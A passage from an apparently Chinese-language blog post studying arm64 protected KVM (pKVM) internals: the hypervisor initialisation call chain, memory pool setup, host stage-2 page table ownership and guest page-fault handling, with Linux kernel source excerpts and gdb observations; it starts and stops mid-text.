class=\"keyword\">struct</span> <span class=\"title class_\">kvm_mem_range</span> cur;</span><br><span class=\"line\">    <span class=\"type\">kvm_pte_t</span> pte;</span><br><span class=\"line\">    s8 level;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">hyp_assert_lock_held</span>(&amp;host_mmu.lock);</span><br><span class=\"line\">    ret = <span class=\"built_in\">kvm_pgtable_get_leaf</span>(&amp;host_mmu.pgt, addr, &amp;pte, &amp;level);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">kvm_pte_valid</span>(pte))<span class=\"comment\">//必须是invalid 这样后面map</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> -EAGAIN;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pte)<span class=\"comment\">// 必须是host自己的 否则权限出错</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> -EPERM;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        u64 granule = <span class=\"built_in\">kvm_granule_size</span>(level);</span><br><span class=\"line\">        cur.start = <span class=\"built_in\">ALIGN_DOWN</span>(addr, granule);</span><br><span class=\"line\">        cur.end = cur.start + granule;</span><br><span class=\"line\">        level++;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> ((level &lt;= KVM_PGTABLE_LAST_LEVEL) &amp;&amp;</span><br><span class=\"line\">            !(<span class=\"built_in\">kvm_level_supports_block_mapping</span>(level) &amp;&amp;</span><br><span class=\"line\">              <span class=\"built_in\">range_included</span>(&amp;cur, range)));</span><br><span class=\"line\"></span><br><span class=\"line\">    *range = cur;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">int</span> __host_stage2_idmap(u64 start, u64 end,</span><br><span class=\"line\">                      <span class=\"keyword\">enum</span> kvm_pgtable_prot prot)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">kvm_pgtable_stage2_map</span>(&amp;host_mmu.pgt, start, end - start, start,</span><br><span class=\"line\">                      prot, &amp;host_s2_pool, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>idmap：identity map start，end-start，start</p>\n<p>Host pf一定发生在hyp memory的大块范围 （例如8G长度）</p>\n<p>这里的host_stage2_adjust_range会调整到4K 或2M 或1G大页的范围</p>\n<p>这里其实权限很松 mem：RWX mmio：RW</p>\n<h3 id=\"初始化pkvm\"><a href=\"#初始化pkvm\" class=\"headerlink\" title=\"初始化pkvm\"></a>初始化pkvm</h3><p>arm64&#x2F;kvm&#x2F;arm.c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_arm_init</span><br><span class=\"line\">    -&gt;init_hyp_mode</span><br><span class=\"line\">        -&gt;kvm_hyp_init_protection</span><br><span class=\"line\">            -&gt;do_pkvm_init</span><br><span class=\"line\">                -&gt;  cpu_hyp_init_context();</span><br><span class=\"line\">                    kvm_call_hyp_nvhe(__pkvm_init)</span><br><span class=\"line\">module_init(kvm_arm_init);</span><br></pre></td></tr></table></figure>\n\n<p>setup.c</p>\n<p>kvm&#x2F;nvhe&#x2F;mem_protect.c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__KVM_HOST_SMCCC_FUNC___pkvm_init handle___pkvm_init</span><br><span class=\"line\">handle_host_hcall</span><br><span class=\"line\">handle_host_hcall</span><br><span class=\"line\">handle___pkvm_init</span><br><span class=\"line\">__pkvm_init</span><br><span class=\"line\">    divide_memory_pool</span><br><span class=\"line\">        -&gt;hyp_pgt_base = hyp_early_alloc</span><br><span class=\"line\">          host_s2_pgt_base = hyp_early_alloc</span><br><span class=\"line\">    recreate_hyp_mappings</span><br><span class=\"line\">        -&gt;kvm_pgtable_hyp_init(&amp;pkvm_pgtable);</span><br><span class=\"line\">            -&gt;pgt-&gt;pgd = zalloc_page();</span><br><span class=\"line\">          pkvm_create_mappings</span><br><span class=\"line\">    update_nvhe_init_params</span><br><span class=\"line\">    -&gt;&#123;for cpus</span><br><span class=\"line\">        params-&gt;pgd_pa = __hyp_pa(pkvm_pgtable.pgd);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __pkvm_init_switch_pgd</span><br><span class=\"line\">        -&gt;msr ttbr0_el2, x4</span><br><span class=\"line\">    __pkvm_init_finalise&#123;</span><br><span class=\"line\">        kvm_host_prepare_stage2&#123;</span><br><span class=\"line\">            __kvm_pgtable_stage2_init(&amp;host_mmu.pgt);</span><br><span class=\"line\">                -&gt;pgt-&gt;pgd = mm_ops-&gt;zalloc_pages_exact(pgd_sz);</span><br><span class=\"line\">            mmu-&gt;pgt = &amp;host_ammu.pgt;</span><br><span class=\"line\">            mmu-&gt;pgd_phys = __hyp_pa(host_mmu.pgt.pgd);</span><br><span class=\"line\">            atomic64_set(&amp;mmu-&gt;vmid.id, 0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        fix_host_ownership();</span><br><span class=\"line\">            -&gt;kvm_pgtable_walk(fix_host_ownership_wakler);</span><br><span class=\"line\">                -&gt;host_stage2_set_owner_locked</span><br><span class=\"line\">                    -&gt;host_stage2_try(kvm_pgtable_stage2_annotate, &amp;host_mmu.pgt);</span><br><span class=\"line\">                        -&gt;kvm_pgtable_walk(pgt, stage2_map_walker);</span><br><span class=\"line\">        __host_enter(host_ctxt);</span><br><span class=\"line\">            -&gt;__host_enter_restore_full</span><br><span class=\"line\">                -&gt;eret</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unreachable</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"hyp-memory\"><a href=\"#hyp-memory\" class=\"headerlink\" title=\"hyp_memory\"></a>hyp_memory</h4><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_hyp_reserve-&gt;</span><br><span class=\"line\">register_memblock_regions&#123;</span><br><span class=\"line\">    for_each_mem_region(reg) &#123;</span><br><span class=\"line\">        hyp_memory[*hyp_memblock_nr_ptr] = *reg;</span><br><span class=\"line\">        (*hyp_memblock_nr_ptr)++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">sort_memblock_regions</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">include/linux/memblock.<span class=\"function\">h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">for</span> <span class=\"params\">(region = memblock.memory.regions; region &lt; memblock.memory.regions + memblock.memory.cnt ; region++)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>这里应该是直接复制了kernel自己的memory block</p>\n<p>用gdb跑下来 结果是0x40000000 0x200000000 (8G) 和qemu有关 只有一个region</p>\n<h4 id=\"内存\"><a href=\"#内存\" class=\"headerlink\" title=\"内存\"></a>内存</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bootmem_init</span><br><span class=\"line\">    -&gt;kvm_hyp_reserve</span><br><span class=\"line\">        -&gt;hyp_mem_base = memblock_phys_alloc</span><br><span class=\"line\">        </span><br><span class=\"line\">__pkvm_init</span><br><span class=\"line\">    -&gt;divide_memory_pool</span><br><span class=\"line\">        -&gt;hyp_early_alloc_init(hyp_mem_base)</span><br><span class=\"line\">          host_s2_pgt_base = hyp_early_alloc</span><br><span class=\"line\">       </span><br><span class=\"line\">  </span><br><span class=\"line\">  __pkvm_init_finalise</span><br><span class=\"line\">      -&gt;kvm_host_prepare_stage2(host_s2_pgt_base)</span><br><span class=\"line\">          -&gt;prepare_s2_pool(pgt_pool_base)</span><br><span class=\"line\">              -&gt;pfn = hyp_virt_to_pfn(pgt_pool_base)</span><br><span class=\"line\">                hyp_pool_init(&amp;host_s2_pool,pfn)</span><br><span class=\"line\">                    -&gt;phys = hyp_pfn_to_phys(pfn)</span><br><span class=\"line\">                      pool-&gt;range_start = phys</span><br><span class=\"line\"></span><br><span class=\"line\">__host_stage2_idmap</span><br><span class=\"line\">    -&gt;kvm_pgtable_stage2_map(&amp;host_mmu.pgt, &amp;host_s2_pool)</span><br><span class=\"line\">        -&gt;map_data.memcache = mc //host_s2_pool</span><br><span class=\"line\">        </span><br><span class=\"line\">        </span><br><span class=\"line\">stage2_map_walk_leaf</span><br><span class=\"line\">    -&gt;childp = mm_ops-&gt;zalloc_page(data-&gt;memcache)</span><br><span class=\"line\">    </span><br><span class=\"line\"> </span><br><span class=\"line\"> prepare_s2_pool</span><br><span class=\"line\">     -&gt;host_mmu.mm_ops = host_s2_zalloc_page</span><br><span class=\"line\">                            -&gt;hyp_alloc_pages(pool)</span><br><span class=\"line\"> kvm_guest_prepare_stage2</span><br><span class=\"line\">     -&gt;vm-&gt;mm_ops = guest_s2_zalloc_page</span><br><span class=\"line\">                     -&gt;hyp_alloc_pages(&amp;current_vm-&gt;pool)</span><br><span class=\"line\"> __pkvm_init_finalise</span><br><span class=\"line\">     -&gt;pkvm_pgtable_mm_ops = &amp;pkvm_pgtable_mm_ops</span><br><span class=\"line\">         = hyp_zalloc_hyp_page</span><br><span class=\"line\">             -&gt;hyp_alloc_pages(&amp;hpool) //static struct hyp_pool pool</span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\"> //guest</span><br><span class=\"line\"> kvm_guest_prepare_stage2</span><br><span class=\"line\">     -&gt;hyp_pool_init(&amp;vm-&gt;pool)</span><br><span class=\"line\"> //hyp</span><br><span class=\"line\"> __pkvm_init_finalise</span><br><span class=\"line\">     -&gt;hyp_pool_init(&amp;hpool)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"页表配置\"><a href=\"#页表配置\" class=\"headerlink\" title=\"页表配置\"></a>页表配置</h4><p>Hyp stage1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">bootmem_init<span class=\"comment\">//arm64/mm/init.c</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> __init <span class=\"title\">kvm_hyp_reserve</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    u64 hyp_mem_pages = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_hyp_mode_available</span>() || <span class=\"built_in\">is_kernel_in_hyp_mode</span>())</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">kvm_get_mode</span>() != KVM_MODE_PROTECTED)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    ret = <span class=\"built_in\">register_memblock_regions</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret) &#123;</span><br><span class=\"line\">        *hyp_memblock_nr_ptr = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">kvm_err</span>(<span class=\"string\">&quot;Failed to register hyp memblocks: %d\\n&quot;</span>, ret);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    hyp_mem_pages += <span class=\"built_in\">hyp_s1_pgtable_pages</span>();</span><br><span class=\"line\">    hyp_mem_pages += <span class=\"built_in\">host_s2_pgtable_pages</span>();</span><br><span class=\"line\">    hyp_mem_pages += <span class=\"built_in\">hyp_vm_table_pages</span>();</span><br><span class=\"line\">    hyp_mem_pages += <span class=\"built_in\">hyp_vmemmap_pages</span>(STRUCT_HYP_PAGE_SIZE);</span><br><span class=\"line\">    hyp_mem_pages += <span class=\"built_in\">hyp_ffa_proxy_pages</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Try to allocate a PMD-aligned region to reduce TLB pressure once</span></span><br><span class=\"line\"><span class=\"comment\">     * this is unmapped from the host stage-2, and fallback to PAGE_SIZE.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    hyp_mem_size = hyp_mem_pages &lt;&lt; PAGE_SHIFT;</span><br><span class=\"line\">    hyp_mem_base = <span class=\"built_in\">memblock_phys_alloc</span>(<span class=\"built_in\">ALIGN</span>(hyp_mem_size, PMD_SIZE),</span><br><span class=\"line\">                       PMD_SIZE);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!hyp_mem_base)</span><br><span class=\"line\">        hyp_mem_base = <span class=\"built_in\">memblock_phys_alloc</span>(hyp_mem_size, PAGE_SIZE);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        hyp_mem_size = <span class=\"built_in\">ALIGN</span>(hyp_mem_size, PMD_SIZE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!hyp_mem_base) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">kvm_err</span>(<span class=\"string\">&quot;Failed to reserve hyp memory\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">kvm_info</span>(<span class=\"string\">&quot;Reserved %lld MiB at 0x%llx\\n&quot;</span>, hyp_mem_size &gt;&gt; <span class=\"number\">20</span>,</span><br><span class=\"line\">         hyp_mem_base);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__pkvm_init(hyp_mem_base,hyp_mem_size)</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">recreate_hyp_mappings</span><span class=\"params\">(<span class=\"type\">phys_addr_t</span> phys, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> size,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                 <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *per_cpu_base,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                 u32 hyp_va_bits)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"type\">void</span> *start, *end, *virt = <span class=\"built_in\">hyp_phys_to_virt</span>(phys);</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">long</span> pgt_size = <span class=\"built_in\">hyp_s1_pgtable_pages</span>() &lt;&lt; PAGE_SHIFT;</span><br><span class=\"line\">        <span class=\"keyword\">enum</span> <span class=\"title class_\">kvm_pgtable_prot</span> prot;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret, i;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Recreate the hyp page-table using the early page allocator */</span></span><br><span class=\"line\">        <span class=\"built_in\">hyp_early_alloc_init</span>(hyp_pgt_base, pgt_size);</span><br><span class=\"line\">        ret = <span class=\"built_in\">kvm_pgtable_hyp_init</span>(&amp;pkvm_pgtable, hyp_va_bits,</span><br><span class=\"line\">                                   &amp;hyp_early_alloc_mm_ops);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">hyp_create_idmap</span>(hyp_va_bits);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">hyp_map_vectors</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">hyp_back_vmemmap</span>(<span class=\"built_in\">hyp_virt_to_phys</span>(vmemmap_base));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(__hyp_text_start, __hyp_text_end, PAGE_HYP_EXEC);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(__hyp_data_start, __hyp_data_end, PAGE_HYP);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(__hyp_rodata_start, __hyp_rodata_end, PAGE_HYP_RO);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(__hyp_bss_start, __hyp_bss_end, PAGE_HYP);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(virt, virt + size, PAGE_HYP);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; hyp_nr_cpus; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_nvhe_init_params</span> *params = <span class=\"built_in\">per_cpu_ptr</span>(&amp;kvm_init_params, i);</span><br><span class=\"line\"></span><br><span class=\"line\">                start = (<span class=\"type\">void</span> *)<span class=\"built_in\">kern_hyp_va</span>(per_cpu_base[i]);</span><br><span class=\"line\">                end = start + <span class=\"built_in\">PAGE_ALIGN</span>(hyp_percpu_size);</span><br><span class=\"line\">                ret = <span class=\"built_in\">pkvm_create_mappings</span>(start, end, PAGE_HYP);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">                ret = <span class=\"built_in\">pkvm_create_stack</span>(params-&gt;stack_pa, &amp;params-&gt;stack_hyp_va);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">create_hyp_host_fp_mappings</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Map the host sections RO in the hypervisor, but transfer the</span></span><br><span class=\"line\"><span class=\"comment\">         * ownership from the host to the hypervisor itself to make sure they</span></span><br><span class=\"line\"><span class=\"comment\">         * can&#x27;t be donated or shared with another entity.</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * The ownership transition requires matching changes in the host</span></span><br><span class=\"line\"><span class=\"comment\">         * stage-2. This will be done later (see finalize_host_mappings()) once</span></span><br><span class=\"line\"><span class=\"comment\">         * the hyp_vmemmap is addressable.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        prot = <span class=\"built_in\">pkvm_mkstate</span>(PAGE_HYP_RO, PKVM_PAGE_SHARED_OWNED);</span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(&amp;kvm_vgic_global_state,</span><br><span class=\"line\">                                   &amp;kvm_vgic_global_state + <span class=\"number\">1</span>, prot);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        start = <span class=\"built_in\">hyp_phys_to_virt</span>(pvmfw_base);</span><br><span class=\"line\">        end = start + pvmfw_size;</span><br><span class=\"line\">        prot = <span class=\"built_in\">pkvm_mkstate</span>(PAGE_HYP_RO, PKVM_PAGE_OWNED);</span><br><span class=\"line\">        ret = <span class=\"built_in\">pkvm_create_mappings</span>(start, end, prot);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>默认是OWNED 0</p>\n<p>映射hyp自己的代码 和一个需要和host共享的</p>\n<p>Host stage2</p>\n<p>Walk hyp的stage1去对应配host的stage2</p>\n<p>其中存在在hyp stage1的都标记为hyp 这样之后就不会map </p>\n<p>share的立即补上map （很少）</p>\n<p>原来是return kvm_pgtable_walk(&amp;pkvm_pgtable, 0, BIT(pkvm_pgtable.ia_bits), &amp;walker); 遍历全部地址范围</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">fix_host_ownership</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable_walker</span> walker = &#123;</span><br><span class=\"line\">        .cb = fix_host_ownership_walker,</span><br><span class=\"line\">        .flags  = KVM_PGTABLE_WALK_LEAF,</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">int</span> i, ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; hyp_memblock_nr; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">memblock_region</span> *reg = &amp;hyp_memory[i];</span><br><span class=\"line\">        u64 start = (u64)<span class=\"built_in\">hyp_phys_to_virt</span>(reg-&gt;base);</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">kvm_pgtable_walk</span>(&amp;pkvm_pgtable, start, reg-&gt;size, &amp;walker);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">fix_host_ownership_walker</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                     <span class=\"keyword\">enum</span> kvm_pgtable_walk_flags visit)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">enum</span> <span class=\"title class_\">kvm_pgtable_prot</span> prot;</span><br><span class=\"line\">        <span class=\"keyword\">enum</span> <span class=\"title class_\">pkvm_page_state</span> state;</span><br><span class=\"line\">        <span class=\"type\">phys_addr_t</span> phys;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_pte_valid</span>(ctx-&gt;old))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ctx-&gt;level != (KVM_PGTABLE_MAX_LEVELS - <span class=\"number\">1</span>))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">        phys = <span class=\"built_in\">kvm_pte_to_phys</span>(ctx-&gt;old);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">addr_is_memory</span>(phys))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Adjust the host stage-2 mappings to match the ownership attributes</span></span><br><span class=\"line\"><span class=\"comment\">         * configured in the hypervisor stage-1.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        state = <span class=\"built_in\">pkvm_getstate</span>(<span class=\"built_in\">kvm_pgtable_hyp_pte_prot</span>(ctx-&gt;old));</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (state) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> PKVM_PAGE_OWNED:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"built_in\">host_stage2_set_owner_locked</span>(phys, PAGE_SIZE, PKVM_ID_HYP);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> PKVM_PAGE_SHARED_OWNED:</span><br><span class=\"line\">                prot = <span class=\"built_in\">pkvm_mkstate</span>(PKVM_HOST_MEM_PROT, PKVM_PAGE_SHARED_BORROWED);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> PKVM_PAGE_SHARED_BORROWED:</span><br><span class=\"line\">                prot = <span class=\"built_in\">pkvm_mkstate</span>(PKVM_HOST_MEM_PROT, PKVM_PAGE_SHARED_OWNED);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">host_stage2_idmap_locked</span>(phys, PAGE_SIZE, prot);</span><br><span class=\"line\">            -&gt;<span class=\"built_in\">kvm_pgtable_stage2_map</span>(&amp;host_mmu.pgt)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>遍历的pt是pkvm_pgtable 就是hyp stage1 地址范围是kernel启动时所有memblock的地址范围</p>\n<p>PAGE_OWNED表示hyp独有 因此从host stage2中移除</p>\n<p>这里hyp stage1空洞的部分 host stage2是不做处理的</p>\n<p>不做处理默认是属于host的 因此handle mem abort的时候会直接补上</p>\n<p>gdb跑下来的结论：</p>\n<ol>\n<li>fix_host_ownership中host_stage2_idmap_locked确实只执行了一次 </li>\n<li>正常启动以后stage2是在host上启用了的</li>\n<li>host_stage2_idmap_locked会执行很多次 且每次size不是4096 应该是host pf进来的</li>\n</ol>\n<p>这里只是保存了通用寄存器然后eret 理论上应该返回到hvc之前的一句 即kvm_call_hyp_nvhe(__pkvm_init)之后</p>\n<p>结束初始化后直接打开了host stage2翻译</p>\n<p>arch&#x2F;arm64&#x2F;kvm&#x2F;hyp&#x2F;nvhe&#x2F;pkvm.c</p>\n<p>arm64&#x2F;kvm&#x2F;pkvm.c</p>\n<p>kvm_call_hyp_nvhe -&gt; arm_smccc_1_1_hvc 执行SMCCC_HVC_INST -&gt; hvc #0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">finalize_pkvm</span><br><span class=\"line\">    -&gt;pkvm_drop_host_privileges</span><br><span class=\"line\">        -&gt;on_each_cpu(_kvm_host_prot_finalize);</span><br><span class=\"line\">            -&gt;kvm_call_hyp_nvhe(__pkvm_prot_finalize);</span><br><span class=\"line\">                -&gt;  hcr_el2 |= HCR_VM;</span><br><span class=\"line\">                    __load_stage2(&amp;host_mmu.arch.mmu,&amp;host_mmu.arch);</span><br><span class=\"line\">device_initcall_sync(finalize_pkvm);</span><br></pre></td></tr></table></figure>\n\n<p>finalize_pkvm用device_initcall_sync调用 调用链不清晰，kvm_arm_init-&gt;__pkvm_init 完成了所有的host stage2页表初始工作</p>\n<h3 id=\"Page-fault\"><a href=\"#Page-fault\" class=\"headerlink\" title=\"Page fault\"></a>Page fault</h3><p>kvm&#x2F;mmu.c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_handle_guest_abort&#123;</span><br><span class=\"line\">    gfn = fault_ipa &gt;&gt; PAGE_SHIFT;</span><br><span class=\"line\">    memslot = gfn_to_memslot(vcpu-&gt;kvm, gfn);</span><br><span class=\"line\">    hva = gfn_to_hva_memslot_prot(memslot,gfn);</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (is_protected_kvm_enabled())</span><br><span class=\"line\">        pkvm_mem_abort</span><br><span class=\"line\">            -&gt; pin_user_pages(hva, &amp;page);</span><br><span class=\"line\">               pfn = page_to_pfn(page);</span><br><span class=\"line\">               pkvm_host_map_guest</span><br><span class=\"line\">                -&gt;kvm_call_hyp_nvhe(__pkvm_host_map_guest)</span><br><span class=\"line\">                    -&gt;__pkvm_host_donate_guest&#123;</span><br><span class=\"line\">                        initiator.id = PKVM_ID_HOST;</span><br><span class=\"line\">                        